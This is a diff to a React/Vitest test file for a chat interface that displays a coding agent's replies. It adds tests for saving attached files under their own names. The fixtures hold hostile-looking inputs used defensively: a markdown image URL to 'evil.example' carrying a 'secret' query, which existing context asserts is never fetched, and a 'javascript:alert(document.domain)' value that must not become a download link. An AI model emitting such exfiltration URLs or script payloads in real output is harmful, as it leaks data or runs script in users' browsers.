@@ -5,8 +5,8 @@
 
 import MessageContentUI from "@neore/chat-ui/chat/message-content";
 import type { ChatMessage } from "@neore/chat-ui/types";
-import { fireEvent, render, screen } from "@testing-library/react";
-import { describe, expect, it, vi } from "vitest";
+import { fireEvent, render, screen, waitFor } from "@testing-library/react";
+import { afterEach, describe, expect, it, vi } from "vitest";
 
 import { toUIMessages } from "@/lib/agent";
 
@@ -27,6 +27,7 @@ vi.mock("@lingui/react/macro", () => {
 });
 
 const LOOKUP_BUTTON = /lookup/u;
+const DATA_FILE_LINK = /data\.bin/u;
 
 const message = (text: string): ChatMessage =>
     ({
@@ -101,5 +102,87 @@ describe("a coding agent's stored reply", () => {
         // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about what the DOM may fetch
         expect(container.querySelector("img")).toBeNull();
         expect(container.textContent).toContain("![](https://evil.example/?q=secret)");
+    });
+});
+
+describe("saving a message's files", () => {
+    const withFiles = {
+        id: "m3",
+        parts: [
+            { filename: "chart.png", mediaType: "image/png", type: "file", url: "https://api.test/agent-files/chart?sig=1" },
+            { filename: "data.bin", mediaType: "application/octet-stream", type: "file", url: "https://api.test/agent-files/data?sig=1" },
+        ],
+        role: "assistant",
+        status: "success",
+    } as unknown as ChatMessage;
+
+    /** Records each download link the save helper clicks, and answers every fetch with a small blob. */
+    const recordSaves = () => {
+        const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
+
+        vi.stubGlobal("URL", Object.assign(URL, { createObjectURL: () => "blob:https://app.test/1", revokeObjectURL: () => {} }));
+        vi.stubGlobal(
+            "fetch",
+            vi.fn(async () => {
+                return { blob: async () => new Blob(["x"], { type: "image/png" }), body: null, ok: true, status: 200 };
+            }),
+        );
+
+        // Each click's `this` is the link the helper clicked.
+        return () =>
+            (clickSpy.mock.contexts as HTMLAnchorElement[]).map((anchor) => {
+                return { download: anchor.download, href: anchor.href };
+            });
+    };
+
+    afterEach(() => {
+        vi.restoreAllMocks();
+        vi.unstubAllGlobals();
+    });
+
+    it("offers a download for an image, named by its file", () => {
+        render(<MessageContentUI message={withFiles} />);
+
+        const link = screen.getByRole("link", { name: "Download chart.png" });
+
+        expect(link.getAttribute("href")).toBe("https://api.test/agent-files/chart?sig=1");
+        expect(link.getAttribute("download")).toBe("chart.png");
+        // Shown on hover or focus, and always where nothing can hover (a touch screen).
+        expect(link.className).toContain("[@media(hover:none)]:opacity-100");
+    });
+
+    it("links no download for an image value a link must not open", () => {
+        const unsafe = {
+            id: "m4",
+            parts: [{ image: ["javascript", ":alert(document.domain)"].join(""), type: "image" }],
+            role: "assistant",
+            status: "success",
+        } as unknown as ChatMessage;
+
+        render(<MessageContentUI message={unsafe} />);
+
+        expect(screen.queryByRole("link", { name: "Download image" })).toBeNull();
+    });
+
+    it("saves the image under its own name, not the storage URL's", async () => {
+        const saved = recordSaves();
+
+        render(<MessageContentUI message={withFiles} />);
+        fireEvent.click(screen.getByRole("link", { name: "Download chart.png" }));
+
+        await waitFor(() => {
+            expect(saved()).toEqual([{ download: "chart.png", href: "blob:https://app.test/1" }]);
+        });
+    });
+
+    it("saves a file card's file under its own name", async () => {
+        const saved = recordSaves();
+
+        render(<MessageContentUI message={withFiles} />);
+        fireEvent.click(await screen.findByRole("link", { name: DATA_FILE_LINK }));
+
+        await waitFor(() => {
+            expect(saved()).toEqual([{ download: "data.bin", href: "blob:https://app.test/1" }]);
+        });
     });
 });
